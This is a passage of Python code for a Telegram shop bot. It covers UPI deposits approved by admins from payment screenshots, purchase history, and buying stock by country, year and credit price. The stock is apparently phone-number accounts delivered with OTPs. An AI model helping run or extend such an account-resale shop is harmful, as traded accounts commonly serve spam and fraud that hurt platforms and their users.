    # Ignore very common transient network errors (Telegram/httpx) to keep logs clean
    try:
        import httpx

        if isinstance(err, (httpx.ReadError, httpx.ConnectTimeout, httpx.ReadTimeout)):
            return
    except Exception:
        pass

    if isinstance(err, (TimedOut, NetworkError)):
        return

    tb = "".join(traceback.format_exception(type(err), err, err.__traceback__))
    try:
        with open(os.path.join(BASE_DIR, "error.txt"), "a", encoding="utf-8") as f:
            f.write("\n\n--- ERROR ---\n")
            f.write(tb)
    except Exception:
        pass

    logger.exception("Unhandled exception: %s", err)


async def _forward_deposit_to_admins(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    *,
    deposit_id: str,
    amount: int,
    method: str,
    network: str | None,
    amount_text: str | None,
    file_kind: str,
    file_id: str,
) -> None:
    # For crypto deposits, admin must set credits first
    if method == "crypto":
        approve_markup = kb(
            [
                [
                    InlineKeyboardButton("✅ Set Credits & Approve", callback_data=f"admin:dep:setcredits:{deposit_id}"),
                    InlineKeyboardButton("❌ Reject", callback_data=f"admin:dep:reject:{deposit_id}"),
                ]
            ]
        )
    else:
        approve_markup = kb(
            [
                [
                    InlineKeyboardButton("✅ Approve", callback_data=f"admin:dep:approve:{deposit_id}"),
                    InlineKeyboardButton("❌ Reject", callback_data=f"admin:dep:reject:{deposit_id}"),
                ]
            ]
        )

    uid = update.effective_user.id
    username = update.effective_user.username
    # IMPORTANT: use plain text (no Markdown) to avoid "Can't parse entities" errors
    # when usernames or other dynamic text contains special characters.
    extra = ""
    if method == "crypto":
        extra = (
            f"\nMethod: Crypto"
            f"\nNetwork: {((network or '').upper())}"
            + (f"\nPaid: {amount_text}" if amount_text else "")
        )
    else:
        extra = "\nMethod: INR"

    info = (
        "💳 Deposit Request\n\n"
        f"User ID: {uid}\n"
        f"Username: @{username if username else 'N/A'}\n"
        f"Amount: {amount}"
        + extra
        + f"\nDeposit ID: {deposit_id}"
    )

    repo: Repo = context.application.bot_data["repo"]

    for admin_id in ADMIN_USER_IDS:
        try:
            if file_kind == "photo":
                await safe_bot_send(
                    context.bot,
                    "send_photo",
                    chat_id=admin_id,
                    photo=file_id,
                    caption=info,
                    parse_mode=ParseMode.HTML,
                    reply_markup=approve_markup,
                )
            else:
                await safe_bot_send(
                    context.bot,
                    "send_document",
                    chat_id=admin_id,
                    document=file_id,
                    caption=info,
                    parse_mode=ParseMode.HTML,
                    reply_markup=approve_markup,
                )

            # Persist delivery success (best-effort diagnostics)
            try:
                await repo.add_deposit_admin_notify(deposit_id, admin_id=int(admin_id), ok=True, error=None)
            except Exception:
                pass

        except Exception as e:
            # Log the error instead of silently ignoring it
            logger.error(f"Failed to send deposit screenshot to admin {admin_id}: {e}")
            try:
                await repo.add_deposit_admin_notify(deposit_id, admin_id=int(admin_id), ok=False, error=str(e))
            except Exception:
                pass

            try:
                with open(os.path.join(BASE_DIR, "error.txt"), "a", encoding="utf-8") as f:
                    f.write(f"\n[DEPOSIT FORWARD ERROR] Admin ID: {admin_id}, Deposit ID: {deposit_id}, Error: {e}\n")
            except Exception:
                pass


async def _qr_expiry_task(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, base_caption: str) -> None:
    """Update QR caption every minute and delete the QR message after 5 minutes."""
    try:
        # Update 4 times: after 1,2,3,4 minutes
        for remaining in (4, 3, 2, 1):
            await asyncio.sleep(60)
            try:
                await context.bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=message_id,
                    caption=f"{base_caption}\n\n⏳ Expires in {remaining} minute(s)",
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb(
                        [
                            [InlineKeyboardButton("✅ Confirm", callback_data="dep:confirm")],
                            [InlineKeyboardButton("❌ Cancel", callback_data="dep:cancel")],
                        ]
                    ),
                )
            except Exception:
                # If it's not a photo/caption message, ignore updates
                pass

        # Final: wait last minute then delete
        await asyncio.sleep(60)
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass
    except Exception:
        pass


async def _process_deposit_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Return True if handled."""
    if not update.message:
        return False

    uid = update.effective_user.id
    if uid not in STATE:
        return False

    st = STATE[uid]
    if st.get("flow") != "deposit" or st.get("step") != "screenshot":
        return False

    repo: Repo = context.application.bot_data["repo"]
    amount = int(st.get("amount", 0))

    # Detect photo or image document
    if update.message.photo:
        deposit_id = await repo.create_deposit_request(
            user_id=uid,
            username=(update.effective_user.username or ""),
            amount=amount,
            method=st.get("method") or "inr",
            network=st.get("network"),
            amount_text=st.get("amount_text"),
        )
        file_id = update.message.photo[-1].file_id
        try:
            await repo.attach_deposit_screenshot(deposit_id, kind="photo", file_id=file_id)
        except Exception:
            pass
        await _forward_deposit_to_admins(
            update,
            context,
            deposit_id=deposit_id,
            amount=amount,
            method=st.get("method") or "inr",
            network=st.get("network"),
            amount_text=st.get("amount_text"),
            file_kind="photo",
            file_id=file_id,
        )
        STATE.pop(uid, None)
        await update.message.reply_text(
            f"<b>✅ {to_smallcaps('Screenshot Received')}</b>\n\n"
            f"<i>⏳ {to_smallcaps('Waiting for admin approval...')}</i>",
            parse_mode=ParseMode.HTML,
        )
        return True

    doc = update.message.document
    if doc and doc.mime_type and doc.mime_type.startswith("image/"):
        deposit_id = await repo.create_deposit_request(
            user_id=uid,
            username=(update.effective_user.username or ""),
            amount=amount,
            method=st.get("method") or "inr",
            network=st.get("network"),
            amount_text=st.get("amount_text"),
        )
        try:
            await repo.attach_deposit_screenshot(deposit_id, kind="document", file_id=doc.file_id)
        except Exception:
            pass

        await _forward_deposit_to_admins(
            update,
            context,
            deposit_id=deposit_id,
            amount=amount,
            method=st.get("method") or "inr",
            network=st.get("network"),
            amount_text=st.get("amount_text"),
            file_kind="document",
            file_id=doc.file_id,
        )
        STATE.pop(uid, None)
        await update.message.reply_text(
            f"<b>✅ {to_smallcaps('Screenshot Received')}</b>\n\n"
            f"<i>⏳ {to_smallcaps('Waiting for admin approval...')}</i>",
            parse_mode=ParseMode.HTML,
        )
        return True

    await update.message.reply_text(
        f"<b>📸 {to_smallcaps('Payment Screenshot Required')}</b>\n\n"
        f"<i>{to_smallcaps('Please send as PHOTO or IMAGE FILE')}</i>",
        parse_mode=ParseMode.HTML,
    )
    return True


async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if await _ban_guard(update, context):
        return
    # Admin flows handled here
    account_manager: AccountManager = context.application.bot_data["account_manager"]
    handled = await admin_module.handle_admin_text(update, context, STATE, account_manager)
    if handled:
        return

    if not update.message:
        return

    uid = update.effective_user.id
    text_in = (update.message.text or "").strip()
    repo: Repo = context.application.bot_data["repo"]

    # Find by Credits flow (user)
    if uid in STATE and STATE[uid].get("flow") == "find_credits" and STATE[uid].get("step") == "input":
        if text_in.lower() == "cancel":
            STATE.pop(uid, None)
            await update.message.reply_text(
                f"<b>❌ {to_smallcaps('Cancelled')}</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=reply_menu(is_admin(uid)),
            )
            return
        if not text_in.isdigit() or int(text_in) <= 0:
            await update.message.reply_text(
                f"<b>💰 {to_smallcaps('Enter Credits')}</b>\n\n"
                f"<i>{to_smallcaps('Send credits as number only, or press Cancel')}</i>",
                parse_mode=ParseMode.HTML,
            )
            return
        max_price = int(text_in)
        STATE[uid] = {"flow": "find_credits", "step": "show", "max_price": max_price}
        total_groups = await repo.count_groups_under_price(max_price=max_price)
        if total_groups <= 0:
            await update.message.reply_text(
                f"<i>❌ {to_smallcaps('No accounts available in this credits range')}</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=reply_menu(is_admin(uid))
            )
            STATE.pop(uid, None)
            return

        # Restore main reply keyboard now that we will show inline results
        # Telegram does not allow empty messages.
        await update.message.reply_text(f"✅ {to_smallcaps('Loading results...')}", reply_markup=reply_menu(is_admin(uid)))

        groups = await repo.list_groups_under_price_page(max_price=max_price, page=0, page_size=10)
        await update.message.reply_text(
            "Results:",
            reply_markup=_find_results_kb(groups, max_price=max_price, page=0, total=total_groups),
        )
        return

    # Persistent reply keyboard routing (main menu)
    if text_in == f"🛒 {to_smallcaps('Buy')}":
        countries = await repo.list_available_countries()
        if not countries:
            await safe_reply_text(update.message, f"<i>❌ {to_smallcaps('No stock available')}</i>", parse_mode=ParseMode.HTML)
            return
        await safe_reply_text(update.message, f"<b>🌍 {to_smallcaps('Select Country')}</b>", reply_markup=countries_keyboard(countries), parse_mode=ParseMode.HTML)
        return

    if text_in == f"💳 {to_smallcaps('Deposit')}":
        # UPI only
        STATE[uid] = {"flow": "deposit", "step": "choose"}
        await update.message.reply_text(
            f"<b>╔══════════════════╗</b>\n"
            f"<b>║   {to_smallcaps('DEPOSIT FUNDS')}   ║</b>\n"
            f"<b>╚══════════════════╝</b>\n\n"
            f"<b>💳 {to_smallcaps('Choose Deposit Method')}</b>\n"
            f"└ 🇮🇳 <i>{to_smallcaps('UPI Payment Available')}</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb(
                [
                    [InlineKeyboardButton(f"🇮🇳 {to_smallcaps('UPI (QR)')}", callback_data="dep:inr")],
                    [InlineKeyboardButton(f"🏠 {to_smallcaps('Menu')}", callback_data="menu:home")],
                ]
            ),
        )
        return

    if text_in == f"💰 {to_smallcaps('Balance')}":
        await show_balance(update, context, edit=False)
        return

    if text_in == f"📜 {to_smallcaps('History')}":
        # Start history at page 0 via new inline message
        total = await repo.count_purchases(user_id=uid)
        items = await repo.list_purchases_page(user_id=uid, page=0, page_size=6)
        lines = [
            f"<b>╔══════════════════╗</b>",
            f"<b>║ {to_smallcaps('PURCHASE HISTORY')} ║</b>",
            f"<b>╚══════════════════╝</b>",
            "",
            f"<b>📜 {to_smallcaps('Page')} 1</b>",
            ""
        ]
        if not items:
            lines.append(f"<i>{to_smallcaps('No purchases yet')}</i>")
        else:
            for i, p in enumerate(items, 1):
                lines.append(
                    f"<b>{i}.</b> 📱 <code>+{p.get('phone','')}</code>\n"
                    f"   ├ 🌍 {to_smallcaps('Country')}: <b>{p.get('country','')}</b>\n"
                    f"   ├ 📅 {to_smallcaps('Year')}: <b>{p.get('year')}</b>\n"
                    f"   └ 💰 {to_smallcaps('Price')}: <b>{p.get('price')}</b> {to_smallcaps('credits')}"
                )
        await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=kb([[InlineKeyboardButton(f"🏠 {to_smallcaps('Menu')}", callback_data="menu:home")]]))
        return

    if text_in == f"🆘 {to_smallcaps('Support')}":
        await update.message.reply_text(
            f"<b>🆘 {to_smallcaps('Support')}</b>\n\n"
            f"└ 💬 <b>@{SUPPORT_USERNAME}</b>",
            parse_mode=ParseMode.HTML
        )
        return

    if text_in == f"🛠 {to_smallcaps('Admin')}" and is_admin(uid):
        # Open admin panel inline menu
        await update.message.reply_text(
            f"<b>🛠 {to_smallcaps('Admin Panel')}</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton(f"🔓 {to_smallcaps('Open')}", callback_data="admin:menu")]])
        )
        return

    # Deposit flow (user)

    uid = update.effective_user.id
    if uid not in STATE:
        return

    st = STATE[uid]
    if st.get("flow") != "deposit":
        return

    repo: Repo = context.application.bot_data["repo"]
    step = st.get("step")

    # Step 1: amount (INR)
    if step == "amount":
        if st.get("method") != "inr":
            return

        amt_text = update.message.text.strip()
        if not amt_text.isdigit() or int(amt_text) <= 0:
            await update.message.reply_text(
                f"<i>⚠️ {to_smallcaps('Send a valid amount (numbers only)')}</i>",
                parse_mode=ParseMode.HTML,
            )
            return
        st["amount"] = int(amt_text)
        st["step"] = "confirm"

        qr_key = (st.get("inr_qr") or "qr").strip().lower()
        cfg = INR_QRS.get(qr_key) or INR_QRS.get("qr") or {}

        payee = (cfg.get("payee_name") or "").strip()
        upi_id = (cfg.get("upi_id") or "").strip()
        notes = (cfg.get("notes") or "").strip()

        upi_html = f"<pre>{html.escape(upi_id)}</pre>" if upi_id else ""
        base_caption = (
            "PAYMENT INFORMATION\n\n"
            + (f"NAME WILL BE -  {html.escape(payee)}\n\n" if payee else "")
            + (f"UPI :\n{upi_html}\n\n" if upi_id else "")
            + (f"{html.escape(notes)}\n\n" if notes else "")
            + "⏳ QR will expire in 5 minutes\n"
            + f"Amount: {st['amount']} INR"
        )

        buttons = kb(
            [
                [InlineKeyboardButton("✅ Confirm", callback_data="dep:confirm")],
                [InlineKeyboardButton("❌ Cancel", callback_data="dep:cancel")],
            ]
        )

        # Show QR (hosted URL)
        qr_message = await _send_qr(
            update,
            caption=base_caption,
            buttons=buttons,
            image_url=(cfg.get("image_url") or "").strip() or None,
            parse_mode=ParseMode.HTML,
        )

        # Save qr message id for later cleanup
        st["qr_chat_id"] = qr_message.chat_id
        st["qr_message_id"] = qr_message.message_id

        # Start countdown updates + delete after 5 minutes
        asyncio.create_task(_qr_expiry_task(context, st["qr_chat_id"], st["qr_message_id"], base_caption))
        return

    # Step 1b: crypto amount text
    if step == "amount_text":
        if st.get("method") != "crypto":
            return
        amt = update.message.text.strip()
        st["amount_text"] = amt
        st["step"] = "confirm"

        net = (st.get("network") or "").strip().lower()
        cfg = {}  # crypto removed
        addr = (cfg.get("address") or "").strip()
        label = (cfg.get("label") or net.upper() or "CRYPTO").strip()
        img_url = (cfg.get("image_url") or "").strip() or None
        caption = f"Network: {label}\n\nAddress/ID:\n`{addr}`\n\nAmount: {amt}\n\n⏳ QR will expire in 5 minutes"

        buttons = kb(
            [[InlineKeyboardButton("✅ Confirm", callback_data="dep:confirm")], [InlineKeyboardButton("❌ Cancel", callback_data="dep:cancel")]]
        )

        msg = await _send_qr(
            update,
            caption=caption,
            buttons=buttons,
            image_url=img_url,
            parse_mode=ParseMode.HTML,
        )

        st["qr_chat_id"] = msg.chat_id
        st["qr_message_id"] = msg.message_id
        asyncio.create_task(_qr_expiry_task(context, st["qr_chat_id"], st["qr_message_id"], caption))
        return

    # Step 2: screenshot is handled by the media handler (photo/document)
    if step == "screenshot":
        await update.message.reply_text(
            f"<b>📸 {to_smallcaps('Send Payment Screenshot')}</b>\n\n"
            f"<i>{to_smallcaps('Send as PHOTO or IMAGE FILE')}</i>",
            parse_mode=ParseMode.HTML,
        )
        return


async def on_media(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Handles deposit screenshots (photo/document). If not part of deposit flow, ignore.
    handled = await _process_deposit_screenshot(update, context)
    if not handled:
        # Diagnostics for debugging
        try:
            uid = update.effective_user.id
            if uid in STATE and STATE[uid].get("flow") == "deposit":
                with open(os.path.join(BASE_DIR, "error.txt"), "a", encoding="utf-8") as f:
                    f.write("\n[deposit] media received but not accepted. step=%s\n" % STATE[uid].get("step"))
        except Exception:
            pass


async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if await _ban_guard(update, context):
        return
    query = update.callback_query
    if not query:
        return

    # IMPORTANT: Do not auto-answer here.
    # If we answer the callback here, later show_alert popups won't work.
    uid = update.effective_user.id
    data = query.data or ""

    # Let admin module handle admin:* callbacks
    handled = await admin_module.handle_admin_callback(update, context, STATE)
    if handled and data.startswith("admin:"):
        return

    repo: Repo = context.application.bot_data["repo"]
    account_manager: AccountManager = context.application.bot_data["account_manager"]

    # Device management callbacks
    handled = await device_manager.handle_device_callbacks(query, context, uid, data, repo, account_manager)
    if handled:
        return

    # Join verify
    if data == "join:verify":
        joined, join_err, missing = await _is_joined(update, context)
        if not joined:
            # If bot cannot verify membership, show clear message
            if join_err and ("not enough rights" in join_err.lower() or "forbidden" in join_err.lower() or "chat not found" in join_err.lower()):
                await safe_query_answer(
                    query,
                    f"⚠️ Verification unavailable. Bot must be admin in @{CHANNEL_USERNAME}.",
                    show_alert=True,
                )
                return

            miss_txt = ", ".join([f"@{c}" for c in (missing or [CHANNEL_USERNAME])])
            await safe_query_answer(
                query,
                f"❌ Not joined yet. Please join {miss_txt} then click Verify again.",
                show_alert=True,
            )
            return

        # Joined: switch this same message into the bot UI (no new message)
        available = await repo.count_available_accounts()
        user = await repo.ensure_user(uid, username=update.effective_user.username)
        is_admin_user = admin_module.is_admin(uid)
        text = _home_caption(uid=uid, credits=int(user.get('credits', 0)), stock=available)
        await safe_edit(query.message, text, reply_markup=main_menu(is_admin_user), parse_mode=ParseMode.HTML)
        await safe_query_answer(query, "✅ Verified", show_alert=False)
        # Send a visible confirmation with bottom reply keyboard
        try:
            await query.message.reply_text(
                f"<b>✅ {to_smallcaps('Verified! Welcome.')}</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=reply_menu(is_admin_user),
            )
        except Exception:
            pass
        return

    if data == "menu:home":
        await safe_query_answer(query, cache_time=0)
        # Edit inline instead of sending new message
        available = await repo.count_available_accounts()
        user = await repo.ensure_user(uid, username=update.effective_user.username)
        is_admin_user = admin_module.is_admin(uid)

        text = _home_caption(uid=uid, credits=int(user.get('credits', 0)), stock=available)

        await safe_edit(query.message, text, reply_markup=main_menu(is_admin_user), parse_mode=ParseMode.HTML)
        return

    # Balance
    if data == "me:balance":
        await safe_query_answer(query, cache_time=0)
        await show_balance(update, context, edit=True)
        return

    # History (pagination)
    if data.startswith("me:history:"):
        await safe_query_answer(query, cache_time=0)
        page = int(data.split(":", 2)[2])
        total = await repo.count_purchases(user_id=uid)
        page_size = 6
        max_page = max(0, (total - 1) // page_size) if total else 0
        if page > max_page:
            page = max_page
        items = await repo.list_purchases_page(user_id=uid, page=page, page_size=page_size)

        lines = [
            f"<b>╔══════════════════╗</b>",
            f"<b>║ {to_smallcaps('PURCHASE HISTORY')} ║</b>",
            f"<b>╚══════════════════╝</b>",
            "",
            f"<b>📜 {to_smallcaps('Page')} {page+1}/{max_page+1 if total else 1}</b>",
            ""
        ]
        if not items:
            lines.append(f"<i>{to_smallcaps('No purchases yet')}</i>")
        else:
            for i, p in enumerate(items, 1):
                phone = p.get("phone") or ""
                country = p.get("country") or ""
                year = p.get("year")
                price = p.get("price")
                lines.append(
                    f"<b>{i}.</b> 📱 <code>+{phone}</code>\n"
                    f"   ├ 🌍 {to_smallcaps('Country')}: <b>{country}</b>\n"
                    f"   ├ 📅 {to_smallcaps('Year')}: <b>{year}</b>\n"
                    f"   └ 💰 {to_smallcaps('Price')}: <b>{price}</b> {to_smallcaps('credits')}"
                )

        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton(f"⬅️ {to_smallcaps('Prev')}", callback_data=f"me:history:{page-1}"))
        if page < max_page:
            nav.append(InlineKeyboardButton(f"{to_smallcaps('Next')} ➡️", callback_data=f"me:history:{page+1}"))

        rows = []
        if nav:
            rows.append(nav)
        rows.append([InlineKeyboardButton(f"🏠 {to_smallcaps('Menu')}", callback_data="menu:home")])

        await safe_edit(query.message, "\n".join(lines), reply_markup=kb(rows), parse_mode=ParseMode.HTML)
        return

    # Deposit
    if data == "dep:start":
        await safe_query_answer(query, cache_time=0)
        # Deposit main menu (UPI only)
        STATE[uid] = {"flow": "deposit", "step": "choose"}

        await safe_edit(
            query.message,
            "💳 *Deposit*\n\nChoose deposit method:",
            reply_markup=kb(
                [
                    [InlineKeyboardButton("🇮🇳 UPI (QR)", callback_data="dep:inr")],
                    [InlineKeyboardButton("🏠 Menu", callback_data="menu:home")],
                ]
            ),
            parse_mode=ParseMode.HTML,
        )
        return

    if data in {"dep:reject", "dep:cancel"}:
        await safe_query_answer(query, cache_time=0)
        if uid in STATE and STATE[uid].get("flow") == "deposit":
            STATE.pop(uid, None)

        # Delete the QR message (nice disappearing animation)
        try:
            await query.message.delete()
        except Exception:
            pass

        # Send fresh menu
        available = await repo.count_available_accounts()
        user = await repo.ensure_user(uid, username=update.effective_user.username)
        is_admin_user = admin_module.is_admin(uid)
        text = _home_caption(uid=uid, credits=int(user.get('credits', 0)), stock=available)

        try:
            await context.bot.send_photo(
                chat_id=uid,
                photo=START_IMAGE,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu(is_admin_user),
            )
        except Exception:
            await context.bot.send_message(
                chat_id=uid,
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu(is_admin_user),
            )
        return

    if data == "dep:inr":
        await safe_query_answer(query, cache_time=0)

        # Single QR (UPI only)
        STATE[uid] = {"flow": "deposit", "step": "inr_amount_pad", "method": "inr", "network": None, "inr_qr": "qr", "amount_str": ""}

        await safe_edit(
            query.message,
            f"<b>🇮🇳 {to_smallcaps('INR Deposit')}</b>\n\n"
            f"<b>💵 {to_smallcaps('Enter Amount')}</b>\n"
            f"└ <i>{to_smallcaps('Use keypad below')}</i>",
            reply_markup=inr_amount_kb(""),
            parse_mode=ParseMode.HTML,
        )
        return

    # INR QR selection removed (single QR only)
    if data.startswith("dep:inrqr:"):
        await safe_query_answer(query, cache_time=0)
        await safe_query_answer(query, "Only one QR is available.", show_alert=True)
        return

    # Crypto deposits removed (UPI only)
    if data == "dep:crypto" or data.startswith("dep:net:"):
        await safe_query_answer(query, cache_time=0)
        await safe_query_answer(query, "Crypto deposits are disabled.", show_alert=True)
        # Hide crypto by returning to dep:start
        await safe_edit(
            query.message,
            "💳 *Deposit*\n\nChoose deposit method:",
            reply_markup=kb(
                [
                    [InlineKeyboardButton("🇮🇳 UPI (QR)", callback_data="dep:inr")],
                    [InlineKeyboardButton("🏠 Menu", callback_data="menu:home")],
                ]
            ),
            parse_mode=ParseMode.HTML,
        )
        return

    if data == "dep:confirm":
        # if expired we will show an alert (answer below)
        if uid not in STATE or STATE[uid].get("flow") != "deposit":
            await safe_query_answer(query, "❌ Deposit session expired. Click Deposit again.", show_alert=True)
            return
        await safe_query_answer(query, cache_time=0)
        STATE[uid]["step"] = "screenshot"
        await safe_edit(
            query.message,
            f"<b>📤 {to_smallcaps('Upload Payment Screenshot')}</b>\n\n"
            f"└ <i>{to_smallcaps('Send photo or image file')}</i>\n\n"
            f"<i>⚠️ {to_smallcaps('You can cancel anytime')}</i>",
            reply_markup=kb([[InlineKeyboardButton(f"❌ {to_smallcaps('Cancel')}", callback_data="dep:cancel"), InlineKeyboardButton(f"🏠 {to_smallcaps('Menu')}", callback_data="menu:home")]]),
            parse_mode=ParseMode.HTML,
        )
        return

    # Find by Credits (all countries)
    if data == "find:credits":
        await safe_query_answer(query, cache_time=0)
        # Switch to text input mode
        STATE[uid] = {"flow": "find_credits", "step": "input"}
        await query.message.reply_text(
            f"<b>╔══════════════════╗</b>\n"
            f"<b>║ {to_smallcaps('FIND BY CREDITS')} ║</b>\n"
            f"<b>╚══════════════════╝</b>\n\n"
            f"<b>🔎 {to_smallcaps('Enter Maximum Credits')}</b>\n\n"
            f"└ <i>{to_smallcaps('Example')}: 40</i>\n\n"
            f"<i>⚠️ {to_smallcaps('Press Cancel to stop')}</i>",
            reply_markup=cancel_only_menu(),
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith("find:page:"):
        await safe_query_answer(query, cache_time=0)
        _, _, max_price_s, page_s = data.split(":", 3)
        max_price = int(max_price_s) if max_price_s.isdigit() else 0
        page = int(page_s) if page_s.isdigit() else 0
        total = await repo.count_groups_under_price(max_price=max_price)
        groups = await repo.list_groups_under_price_page(max_price=max_price, page=page, page_size=10)
        await safe_edit(
            query.message,
            f"<b>🔎 {to_smallcaps('Results')} ({to_smallcaps('Page')} {page+1})</b>",
            reply_markup=_find_results_kb(groups, max_price=max_price, page=page, total=total),
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith("find:pickgrp:"):
        await safe_query_answer(query, cache_time=0)
        _, _, country, year_token, price_s = data.split(":", 4)
        await safe_edit(
            query.message,
            f"<b>╔══════════════════╗</b>\n"
            f"<b>║ {to_smallcaps('CONFIRM PURCHASE')} ║</b>\n"
            f"<b>╚══════════════════╝</b>\n\n"
            f"<b>📋 {to_smallcaps('Order Summary')}</b>\n"
            f"├ 🌍 {to_smallcaps('Country')}: <b>{country}</b>\n"
            f"├ 📅 {to_smallcaps('Year')}: <b>{year_token}</b>\n"
            f"└ 💰 {to_smallcaps('Price')}: <b>{price_s}</b> {to_smallcaps('credits')}\n\n"
            f"<i>⚠️ {to_smallcaps('No refunds except OTP not received')}</i>",
            reply_markup=kb(
                [
                    [InlineKeyboardButton(f"✅ {to_smallcaps('Confirm Buy')}", callback_data=f"find:buygrp:{country}:{year_token}:{price_s}")],
                    [InlineKeyboardButton(f"⬅️ {to_smallcaps('Back')}", callback_data="menu:home")],
                ]
            ),
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith("find:buygrp:"):
        _, _, country, year_token, price_s = data.split(":", 4)
        price = int(price_s) if price_s.isdigit() else 0
        year = None if year_token == "none" else (int(year_token) if year_token.isdigit() else year_token)

        account, reason = await repo.buy_account_by_group(
            user_id=uid,
            username=(update.effective_user.username or ""),
            country=country,
            year=year,
            price=price,
        )
        if not account:
            if reason == "insufficient_credits":
                udoc = await repo.ensure_user(uid, username=update.effective_user.username)
                have = int(udoc.get("credits", 0))
                await safe_query_answer(query, f"❌ Not enough credits. You have: {have}", show_alert=True)
                return
            await safe_query_answer(query, f"❌ {to_smallcaps('Purchase failed')}", show_alert=True)
            return

        await query.message.reply_text(
            f"<b>✅ {to_smallcaps('Purchase Confirmed')}</b>\n\n"
            f"<i>⚠️ {to_smallcaps('No refunds except OTP not received')}</i>",
            parse_mode=ParseMode.HTML,
        )
        await send_purchase_details(update, context, account)
        return

    # INR dial pad
    if data.startswith("inrpad:"):
        await safe_query_answer(query, cache_time=0)
        if uid not in STATE or STATE[uid].get("flow") != "deposit" or STATE[uid].get("step") != "inr_amount_pad":
            return
        st = STATE[uid]
        amt = str(st.get("amount_str") or "")
        action = data.split(":", 1)[1]

        if action.isdigit():
            amt = (amt + action).lstrip("0")
        elif action == "del":
            amt = amt[:-1]
        elif action == "ok":
            if not amt.isdigit() or int(amt) <= 0:
                await safe_query_answer(query, "Enter valid amount", show_alert=True)
                return
            st["amount"] = int(amt)
            st["step"] = "confirm"

            # Reuse existing INR QR send logic by calling the same code path via text handler
            cfg = INR_QRS.get((st.get("inr_qr") or "qr").strip().lower()) or INR_QRS.get("qr") or {}
            payee = (cfg.get("payee_name") or "").strip()
            upi_id = (cfg.get("upi_id") or "").strip()
            notes = (cfg.get("notes") or "").strip()
            upi_html = f"<code>{html.escape(upi_id)}</code>" if upi_id else ""
            base_caption = (
                f"<b>╔══════════════════╗</b>\n"
                f"<b>║ {to_smallcaps('PAYMENT INFORMATION')} ║</b>\n"
                f"<b>╚══════════════════╝</b>\n\n"
                + (f"<b>👤 {to_smallcaps('Payee Name')}</b>\n└ <b>{html.escape(payee)}</b>\n\n" if payee else "")
                + (f"<b>💳 {to_smallcaps('UPI ID')}</b>\n└ {upi_html}\n\n" if upi_id else "")
                + (f"<b>📝 {to_smallcaps('Notes')}</b>\n└ <i>{html.escape(notes)}</i>\n\n" if notes else "")
                + f"<b>💰 {to_smallcaps('Amount')}</b>\n└ <b>{st['amount']} INR</b>\n\n"
                + f"<i>⏳ {to_smallcaps('QR expires in 5 minutes')}</i>"
            )

            buttons = kb(
                [
                    [InlineKeyboardButton(f"✅ {to_smallcaps('Confirm')}", callback_data="dep:confirm")],
                    [InlineKeyboardButton(f"❌ {to_smallcaps('Cancel')}", callback_data="dep:cancel")],
                ]
            )

            msg = await _send_qr(
                update,
                caption=base_caption,
                buttons=buttons,
                image_url=(cfg.get("image_url") or "").strip() or None,
                parse_mode=ParseMode.HTML,
            )
            st["qr_chat_id"] = msg.chat_id
            st["qr_message_id"] = msg.message_id
            asyncio.create_task(_qr_expiry_task(context, st["qr_chat_id"], st["qr_message_id"], base_caption))
            return

        st["amount_str"] = amt
        # Update screen
        label = (
            f"<b>💵 {to_smallcaps('Enter Amount')}</b>\n\n"
            f"└ <code>{(amt if amt else '0')}</code> INR"
        )
        await safe_edit(query.message, label, reply_markup=inr_amount_kb(amt), parse_mode=ParseMode.HTML)
        return

    # Shop
    if data == "shop:countries":
        await safe_query_answer(query, cache_time=0)

        countries = await repo.list_available_countries()
        if not countries:
            await safe_query_answer(query, "❌ No stock available right now.", show_alert=True)
            return
        await safe_edit(
            query.message, 
            f"<b>🌍 {to_smallcaps('Select Country')}</b>\n\n"
            f"└ <i>{to_smallcaps('Choose from available stock')}</i>",
            reply_markup=countries_keyboard(countries), 
            parse_mode=ParseMode.HTML
        )
        return

    if data.startswith("shop:country:"):
        await safe_query_answer(query, cache_time=0)
        country = data.split(":", 2)[2]
        years = await repo.list_available_years_for_country(country)
        await safe_edit(
            query.message,
            f"{country}: Select year:",
            reply_markup=years_keyboard(country, years),
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith("shop:year:"):
        await safe_query_answer(query, cache_time=0)
        _, _, country, year_token = data.split(":", 3)
        year_text = year_token
        # Show admin-set price range for the selected category
        if year_token == "none":
            year_for_range = None
        elif year_token.isdigit():
            year_for_range = int(year_token)
        else:
            year_for_range = year_token

        pr = await repo.available_price_range(country=country, year=year_for_range)
        min_p = pr.get("min_price")
        max_p = pr.get("max_price")
        if min_p is None:
            price_line = "Price: not set"
        elif min_p == max_p:
            price_line = f"Price: {min_p} credit(s)"
        else:
            price_line = f"Price: {min_p} - {max_p} credit(s)"

        await safe_edit(
            query.message,
            f"<b>╔══════════════════╗</b>\n"
            f"<b>║ {to_smallcaps('CONFIRM PURCHASE')} ║</b>\n"
            f"<b>╚══════════════════╝</b>\n\n"
            f"<b>📋 {to_smallcaps('Order Summary')}</b>\n"
            f"├ 🌍 {to_smallcaps('Country')}: <b>{country}</b>\n"
            f"├ 📅 {to_smallcaps('Year')}: <b>{year_text}</b>\n"
            f"└ 💰 {to_smallcaps('Price')}: <b>{price_line}</b>\n\n"
            f"<i>⚠️ {to_smallcaps('No refunds except OTP not received')}</i>",
            reply_markup=buy_confirm_keyboard(country, year_token),
